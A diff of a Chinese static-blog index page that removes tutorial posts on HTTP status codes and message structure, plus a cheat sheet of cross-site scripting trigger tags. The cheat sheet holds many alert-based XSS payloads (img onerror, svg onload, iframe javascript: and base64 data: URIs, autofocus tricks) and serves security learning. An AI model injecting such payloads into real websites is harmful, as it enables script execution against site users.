@@ -71,442 +71,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-Web/HTTP教程/HTTP 状态码" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20%E7%8A%B6%E6%80%81%E7%A0%81/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p>
-<p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p>
-<p>下面是常见的 HTTP 状态码：</p>
-<ul>
-<li><p><strong>1xx（信息性状态码）</strong> ：表示接收的请求正在处理。</p>
-</li>
-<li><p><strong>2xx（成功状态码）</strong> ：表示请求正常处理完毕。</p>
-</li>
-<li><p><strong>3xx（重定向状态码）</strong> ：需要后续操作才能完成这一请求。</p>
-</li>
-<li><p><strong>4xx（客户端错误状态码）</strong> ：表示请求包含语法错误或无法完成。</p>
-</li>
-<li><p><strong>5xx（服务器错误状态码）</strong> ：服务器在处理请求的过程中发生了错误。</p>
-</li>
-<li><p>200 OK：请求成功</p>
-</li>
-<li><p>204 No Content：请求成功，但响应报文不含实体的主体部分</p>
-</li>
-<li><p>301 Moved Permanently：永久性重定向</p>
-</li>
-<li><p>302 Found：临时性重定向</p>
-</li>
-<li><p>304 Not Modified：未修改</p>
-</li>
-<li><p>400 Bad Request：请求报文存在语法错误</p>
-</li>
-<li><p>401 Unauthorized：需要认证</p>
-</li>
-<li><p>403 Forbidden：请求被服务器拒绝</p>
-</li>
-<li><p>404 Not Found：无法找到指定位置的资源</p>
-</li>
-<li><p>500 Internal Server Error：服务器内部错误</p>
-</li>
-<li><p>503 Service Unavailable：服务器暂时处于超负载或正在停机维护</p>
-</li>
-</ul>
-<hr>
-<h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p>
-<table>
-<thead>
-<tr>
-<th>分类</th>
-<th>分类描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1**</td>
-<td>信息，服务器收到请求，需要请求者继续执行操作</td>
-</tr>
-<tr>
-<td>2**</td>
-<td>成功，操作被成功接收并处理</td>
-</tr>
-<tr>
-<td>3**</td>
-<td>重定向，需要进一步的操作以完成请求</td>
-</tr>
-<tr>
-<td>4**</td>
-<td>客户端错误，请求包含语法错误或无法完成请求</td>
-</tr>
-<tr>
-<td>5**</td>
-<td>服务器错误，服务器在处理请求的过程中发生了错误</td>
-</tr>
-</tbody></table>
-<p>HTTP状态码列表:</p>
-<table>
-<thead>
-<tr>
-<th>状态码</th>
-<th>状态码英文名称</th>
-<th>中文描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>100</td>
-<td>Continue</td>
-<td>继续。客户端应继续其请求</td>
-</tr>
-<tr>
-<td>101</td>
-<td>Switching Protocols</td>
-<td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>200</td>
-<td>OK</td>
-<td>请求成功。一般用于GET与POST请求</td>
-</tr>
-<tr>
-<td>201</td>
-<td>Created</td>
-<td>已创建。成功请求并创建了新的资源</td>
-</tr>
-<tr>
-<td>202</td>
-<td>Accepted</td>
-<td>已接受。已经接受请求，但未处理完成</td>
-</tr>
-<tr>
-<td>203</td>
-<td>Non-Authoritative Information</td>
-<td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
-</tr>
-<tr>
-<td>204</td>
-<td>No Content</td>
-<td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
-</tr>
-<tr>
-<td>205</td>
-<td>Reset Content</td>
-<td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
-</tr>
-<tr>
-<td>206</td>
-<td>Partial Content</td>
-<td>部分内容。服务器成功处理了部分GET请求</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>300</td>
-<td>Multiple Choices</td>
-<td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
-</tr>
-<tr>
-<td>301</td>
-<td>Moved Permanently</td>
-<td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
-</tr>
-<tr>
-<td>302</td>
-<td>Found</td>
-<td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
-</tr>
-<tr>
-<td>303</td>
-<td>See Other</td>
-<td>查看其它地址。与301类似。使用GET和POST请求查看</td>
-</tr>
-<tr>
-<td>304</td>
-<td>Not Modified</td>
-<td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
-</tr>
-<tr>
-<td>305</td>
-<td>Use Proxy</td>
-<td>使用代理。所请求的资源必须通过代理访问</td>
-</tr>
-<tr>
-<td>306</td>
-<td>Unused</td>
-<td>已经被废弃的HTTP状态码</td>
-</tr>
-<tr>
-<td>307</td>
-<td>Temporary Redirect</td>
-<td>临时重定向。与302类似。使用GET请求重定向</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>400</td>
-<td>Bad Request</td>
-<td>客户端请求的语法错误，服务器无法理解</td>
-</tr>
-<tr>
-<td>401</td>
-<td>Unauthorized</td>
-<td>请求要求用户的身份认证</td>
-</tr>
-<tr>
-<td>402</td>
-<td>Payment Required</td>
-<td>保留，将来使用</td>
-</tr>
-<tr>
-<td>403</td>
-<td>Forbidden</td>
-<td>服务器理解请求客户端的请求，但是拒绝执行此请求</td>
-</tr>
-<tr>
-<td>404</td>
-<td>Not Found</td>
-<td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
-</tr>
-<tr>
-<td>405</td>
-<td>Method Not Allowed</td>
-<td>客户端请求中的方法被禁止</td>
-</tr>
-<tr>
-<td>406</td>
-<td>Not Acceptable</td>
-<td>服务器无法根据客户端请求的内容特性完成请求</td>
-</tr>
-<tr>
-<td>407</td>
-<td>Proxy Authentication Required</td>
-<td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
-</tr>
-<tr>
-<td>408</td>
-<td>Request Time-out</td>
-<td>服务器等待客户端发送的请求时间过长，超时</td>
-</tr>
-<tr>
-<td>409</td>
-<td>Conflict</td>
-<td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
-</tr>
-<tr>
-<td>410</td>
-<td>Gone</td>
-<td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
-</tr>
-<tr>
-<td>411</td>
-<td>Length Required</td>
-<td>服务器无法处理客户端发送的不带Content-Length的请求信息</td>
-</tr>
-<tr>
-<td>412</td>
-<td>Precondition Failed</td>
-<td>客户端请求信息的先决条件错误</td>
-</tr>
-<tr>
-<td>413</td>
-<td>Request Entity Too Large</td>
-<td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
-</tr>
-<tr>
-<td>414</td>
-<td>Request-URI Too Large</td>
-<td>请求的URI过长（URI通常为网址），服务器无法处理</td>
-</tr>
-<tr>
-<td>415</td>
-<td>Unsupported Media Type</td>
-<td>服务器无法处理请求附带的媒体格式</td>
-</tr>
-<tr>
-<td>416</td>
-<td>Requested range not satisfiable</td>
-<td>客户端请求的范围无效</td>
-</tr>
-<tr>
-<td>417</td>
-<td>Expectation Failed（预期失败）</td>
-<td>服务器无法满足请求头中 Expect 字段指定的预期行为。</td>
-</tr>
-<tr>
-<td>418</td>
-<td>I’m a teapot</td>
-<td>状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>500</td>
-<td>Internal Server Error</td>
-<td>服务器内部错误，无法完成请求</td>
-</tr>
-<tr>
-<td>501</td>
-<td>Not Implemented</td>
-<td>服务器不支持请求的功能，无法完成请求</td>
-</tr>
-<tr>
-<td>502</td>
-<td>Bad Gateway</td>
-<td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
-</tr>
-<tr>
-<td>503</td>
-<td>Service Unavailable</td>
-<td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
-</tr>
-<tr>
-<td>504</td>
-<td>Gateway Time-out</td>
-<td>充当网关或代理的服务器，未及时从远端服务器获取请求</td>
-</tr>
-<tr>
-<td>505</td>
-<td>HTTP Version not supported</td>
-<td>服务器不支持请求的HTTP协议的版本，无法完成处理</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20%E7%8A%B6%E6%80%81%E7%A0%81/" data-id="cmawcq0ms0012rk7k9h7hcs6x" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/HTTP教程/HTTP信息结构" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%84/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="HTTP信息结构"><a href="#HTTP信息结构" class="headerlink" title="HTTP信息结构"></a>HTTP信息结构</h1><p>HTTP 是基于<strong>客户端&#x2F;服务端（C&#x2F;S）</strong> 的架构模型，通过一个可靠的链接来交换信息，是一个<strong>无状态的请求&#x2F;响应协议</strong>。</p>
-<p>HTTP 消息是客户端和服务器之间通信的基础，它们由一系列的文本行组成，遵循特定的格式和结构。</p>
-<p>HTTP消息分为两种类型：请求消息和响应消息。</p>
-<p>一个 HTTP 客户端是一个应用程序（Web 浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个 HTTP 的请求的目的。</p>
-<p>一个 HTTP 服务器 同样也是一个应用程序（通常是一个 Web 服务，如 Nginx、Apache 服务器或 IIS 服务器等），通过接收客户端的请求并向客户端发送 HTTP 响应数据。</p>
-<p><img src="/.com//image-20250520030550-1c25gs4.png" alt="image"></p>
-<hr>
-<h2 id="客户端请求消息"><a href="#客户端请求消息" class="headerlink" title="客户端请求消息"></a>客户端请求消息</h2><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：<strong>请求行（request line）</strong> 、<strong>请求头部（header）</strong> 、空行和<strong>请求数据</strong>四个部分组成，下图给出了请求报文的一般格式。</p>
-<p><img src="/.com//image-20250520030559-jci9yiy.png" alt="image"></p>
-<ul>
-<li><p><strong>请求行</strong>（Request Line）：</p>
-<ul>
-<li><strong>方法</strong>：如 <strong>GET、POST、PUT、DELETE</strong>等，指定要执行的操作。</li>
-<li><strong>请求 URI</strong>（统一资源标识符）：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li>
-<li><strong>HTTP 版本</strong>：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2。</li>
-</ul>
-<p>请求行的格式示例：<code>GET /index.html HTTP/1.1</code>​</p>
-</li>
-<li><p><strong>请求头</strong>（Request Headers）：</p>
-<ul>
-<li>包含了客户端环境信息、请求体的大小（如果有）、客户端支持的压缩类型等。</li>
-<li>常见的请求头包括<code>Host</code>​、<code>User-Agent</code>​、<code>Accept</code>​、<code>Accept-Encoding</code>​、<code>Content-Length</code>​等。</li>
-</ul>
-</li>
-<li><p><strong>空行</strong>：</p>
-<ul>
-<li>请求头和请求体之间的<strong>分隔符</strong>，表示请求头的结束。</li>
-</ul>
-</li>
-<li><p><strong>请求体</strong>（可选）：</p>
-<ul>
-<li>在某些类型的HTTP请求（如 <strong>POST 和 PUT</strong>）中，请求体包含要发送给服务器的数据。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h2><p>HTTP 响应也由四个部分组成，分别是：<strong>状态行、消息报头、空行和响应正文</strong>。</p>
-<p><img src="/.com//image-20250520030619-j7zy37b.png" alt="image"></p>
-<ul>
-<li><p><strong>状态行</strong>（Status Line）：</p>
-<ul>
-<li><strong>HTTP 版本</strong>：与请求消息中的版本相匹配。</li>
-<li><strong>状态码</strong>：三位数，表示请求的处理结果，如 200 表示成功，404 表示未找到资源。</li>
-<li><strong>状态信息</strong>：状态码的简短描述。</li>
-</ul>
-<p>状态行的格式示例：<code>HTTP/1.1 200 OK</code>​</p>
-</li>
-<li><p><strong>响应头</strong>（Response Headers）：</p>
-<ul>
-<li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li>
-<li>常见的响应头包括<code>Content-Type</code>​、<code>Content-Length</code>​、<code>Server</code>​、<code>Set-Cookie</code>​等。</li>
-</ul>
-</li>
-<li><p><strong>空行</strong>：</p>
-<ul>
-<li>响应头和响应体之间的分隔符，表示响应头的结束。</li>
-</ul>
-</li>
-<li><p><strong>响应体</strong>（可选）：</p>
-<ul>
-<li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>下面实例是一点典型的使用 GET 来传递数据的实例：</p>
-<p>客户端请求：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-
-<p>服务端响应:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 18 Apr 2024 12:00:00 GMT</span><br><span class="line">Server: Apache/2.4.1 (Unix)</span><br><span class="line">Last-Modified: Wed, 18 Apr 2024 11:00:00 GMT</span><br><span class="line">Content-Length: 12345</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Example Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, World!&lt;/h1&gt;</span><br><span class="line">    &lt;!-- The rest of the HTML content --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在实际应用中，HTTP 消息可以包含更多的头字段，并且请求体和响应体的大小会根据传输的数据而变化。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%84/" data-id="cmawcq0mt0016rk7ka1tpbds4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-Web/HTTP教程/HTTP请求头" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/" class="article-date">
@@ -603,7 +167,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/" data-id="cmawcq0mt0018rk7kfhvtfnjp" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4/" data-id="cmawczpnt0012ik7k9rcy8po0" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -773,36 +337,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF/" data-id="cmawcq0mv001frk7k8hu71nsy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/XSS/XSStrike" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/XSS/XSStrike/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h1><p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/XSS/XSStrike/" data-id="cmawcq0mv001hrk7k7b6c0xle" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF/" data-id="cmawczpnu0014ik7k8yudblxi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -907,214 +442,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="cmawcq0mw001krk7kaevgegz3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/XSS/XSS常见的触发标签" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/XSS/XSS%E5%B8%B8%E8%A7%81%E7%9A%84%E8%A7%A6%E5%8F%91%E6%A0%87%E7%AD%BE/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="XSS常见的触发标签"><a href="#XSS常见的触发标签" class="headerlink" title="XSS常见的触发标签"></a>XSS常见的触发标签</h1><h3 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h3><h4 id="​​"><a href="#​​" class="headerlink" title="​&lt;script&gt;​"></a>​<code>&lt;script&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-1"><a href="#​​-1" class="headerlink" title="​&lt;img&gt;​"></a>​<code>&lt;img&gt;</code>​</h4><blockquote>
-<p>图片加载错误时触发<br>​<code>&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code>​<br>​<code>&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;</code>​<br>鼠标指针移动到元素时触发<br>​<code>&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</code>​<br>鼠标指针移出时触发<br>​<code>&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-2"><a href="#​​-2" class="headerlink" title="​&lt;a&gt;​"></a>​<code>&lt;a&gt;</code>​</h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.qq.com">qq</a><br>&lt;a href&#x3D;javascript:alert(‘xss’)&gt;test<br><a href="javascript:a" onmouseover="alert(/xss/)">aa</a><br>&lt;a href&#x3D;”” onclick&#x3D;alert(‘xss’)&gt;a<br>&lt;a href&#x3D;”” onclick&#x3D;eval(alert(‘xss’))&gt;aa<br>&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(‘xss’) y&#x3D;2016&gt;aa</p>
-</blockquote>
-<h4 id="​​-3"><a href="#​​-3" class="headerlink" title="​&lt;input&gt;​"></a>​<code>&lt;input&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>竞争焦点，从而触发onblur事件<br>​<code>&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</code>​<br>​<code>&lt;input value=&quot;&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#39;xss&#39;) bad=&quot;&quot;&gt;</code>​<br>​<code>&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</code>​<br>按下按键时触发<br>​<code>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</code>​<br>松开按键式时触发<br>​<code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-4"><a href="#​​-4" class="headerlink" title="​&lt;from&gt;​"></a>​<code>&lt;from&gt;</code>​</h4><blockquote>
-<p>​&#96;&lt;form action&#x3D;javascript:alert(‘xss’) method&#x3D;”get”&gt;</p>
-<form action="javascript:alert('xss')">`​  
-​`<form method="post" action="aa.asp?" onmouseover="prompt('xss')">
-<form method="post" action="aa.asp?" onmouseover="alert('xss')">
-<form action="1" onmouseover="alert('xss)">`​  
-​`<form method="post" action="data:text/html;base64,<script>alert('xss')</script>">`​  
-​`<form method="post" action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">`​</form></form></form></form></form></form></blockquote>
-<h4 id="​​-5"><a href="#​​-5" class="headerlink" title="​&lt;iframe&gt;​"></a>​<code>&lt;iframe&gt;</code>​</h4><blockquote>
-<p>​&#96; &lt;iframe onload&#x3D;alert(“xss”);&gt;</p>
-<iframe src="javascript:alert('xss')"></iframe>
-<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
-<iframe src="data:text/html;base64,<script>alert('xss')</script>">
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
-<iframe src="aaa" onmouseover="alert('xss')"><iframe>
-<iframe src="javascript&colon;prompt&lpar;``xss``&rpar;"></iframe>(‍````只有两个``) `​</iframe></iframe></iframe></iframe></blockquote>
-<h4 id="​​-6"><a href="#​​-6" class="headerlink" title="​&lt;svg&gt;​"></a>​<code>&lt;svg&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;svg onload=alert(1)&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-7"><a href="#​​-7" class="headerlink" title="​&lt;body&gt;​"></a>​<code>&lt;body&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;body onload=&quot;alert(1)&quot;&gt;</code>​<br>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发<br>​<code>&lt;body onscroll=alert(&quot;xss&quot;);&gt;</code>​</p>
-<p>​<code>&lt;input autofocus&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-8"><a href="#​​-8" class="headerlink" title="​&lt;button&gt;​"></a>​<code>&lt;button&gt;</code>​</h4><blockquote>
-<p>元素上点击鼠标时触发<br> <code>&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-9"><a href="#​​-9" class="headerlink" title="​&lt;p&gt;​"></a>​<code>&lt;p&gt;</code>​</h4><blockquote>
-<p>元素上按下鼠标时触发<br> <code>&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​<br> 元素上释放鼠标时触发<br> <code>&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-10"><a href="#​​-10" class="headerlink" title="​&lt;details&gt;​"></a>​<code>&lt;details&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​<br>使用open属性触发ontoggle事件，无需用户去触发<br>​<code>&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-11"><a href="#​​-11" class="headerlink" title="​&lt;select&gt;​"></a>​<code>&lt;select&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</code>​<br>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发<br>​<code>&lt;select onfocus=alert(1) autofocus&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-12"><a href="#​​-12" class="headerlink" title="​&lt;video&gt;​"></a>​<code>&lt;video&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-13"><a href="#​​-13" class="headerlink" title="​&lt;audio&gt;​"></a>​<code>&lt;audio&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;audio src=x onerror=alert(&quot;xss&quot;);&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-14"><a href="#​​-14" class="headerlink" title="​&lt;textarea&gt;​"></a>​<code>&lt;textarea&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code>​</p>
-</blockquote>
-<h4 id="​​-15"><a href="#​​-15" class="headerlink" title="​&lt;keygen&gt;​"></a>​<code>&lt;keygen&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code>​</p>
-</blockquote>
-<h4 id="​​-16"><a href="#​​-16" class="headerlink" title="​&lt;marquee&gt;​"></a>​<code>&lt;marquee&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code>​</p>
-</blockquote>
-<h4 id="​​-17"><a href="#​​-17" class="headerlink" title="​&lt;isindex&gt;​"></a>​<code>&lt;isindex&gt;</code>​</h4><blockquote>
-<p>​<code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code>​</p>
-</blockquote>
